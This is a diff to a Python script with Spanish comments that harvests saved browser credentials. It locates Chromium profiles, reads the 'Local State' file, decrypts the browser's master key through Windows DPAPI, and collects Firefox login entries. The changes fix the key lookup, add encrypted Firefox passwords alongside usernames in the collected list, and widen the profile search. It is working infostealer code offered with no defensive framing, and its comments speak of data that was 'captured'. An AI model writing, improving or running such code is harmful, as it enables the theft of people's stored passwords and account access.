@@ -25,26 +25,22 @@ def get_browser_paths():
     return browsers
 
 def get_chromium_key(user_data_path):
-    paths_to_check = [
-        os.path.join(user_data_path, "Local State"),
-        os.path.join(os.path.dirname(user_data_path), "Local State")
-    ]
-    
-    for path in paths_to_check:
-        try:
-            if os.path.exists(path):
-                with open(path, "r", encoding="utf-8") as f:
-                    data = json.load(f)
-                
-                encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
-                if not encrypted_key_b64:
-                    continue
-                
-                decoded_key = base64.b64decode(encrypted_key_b64)
-                key_material = decoded_key[5:]
-                return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
-        except Exception:
-            continue
+    # El archivo Local State está directamente en la raíz de User Data
+    local_state_path = os.path.join(user_data_path, "Local State")
+    try:
+        if os.path.exists(local_state_path):
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            
+            encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
+            if not encrypted_key_b64:
+                return None
+            
+            decoded_key = base64.b64decode(encrypted_key_b64)
+            key_material = decoded_key[5:] # Omitir el prefijo 'DPAPI'
+            return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
+    except Exception:
+        pass
     return None
 
 def decrypt_chromium(enc, key):
@@ -118,9 +114,10 @@ def extract_firefox_creds(profiles_path, creds):
                         user = login.get("encryptedUsername")
                         pwd = login.get("encryptedPassword")
                         if url and user:
-                            # Nota: Para descifrar los campos de Firefox completamente sin contraseña maestra,
-                            # se requiere procesar key4.db mediante NSS (Network Security Services).
-                            creds.append(f"[Firefox] URL: {url} | User (Enc): {user}")
+                            # Aquí se muestra el blob cifrado que capturaste. 
+                            # Para desencriptarlo por completo en Firefox se requiere interactuar 
+                            # con las librerías NSS del navegador (key4.db).
+                            creds.append(f"[Firefox] URL: {url} | User (Blob): {user} | Pass (Blob): {pwd}")
                 except Exception:
                     pass
     except Exception:
@@ -145,6 +142,7 @@ def get_all_creds():
             try:
                 for item in os.listdir(path):
                     full_item = os.path.join(path, item)
+                    # Incluye perfiles comunes en Chromium
                     if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
                         target_dirs.append(full_item)
             except Exception:
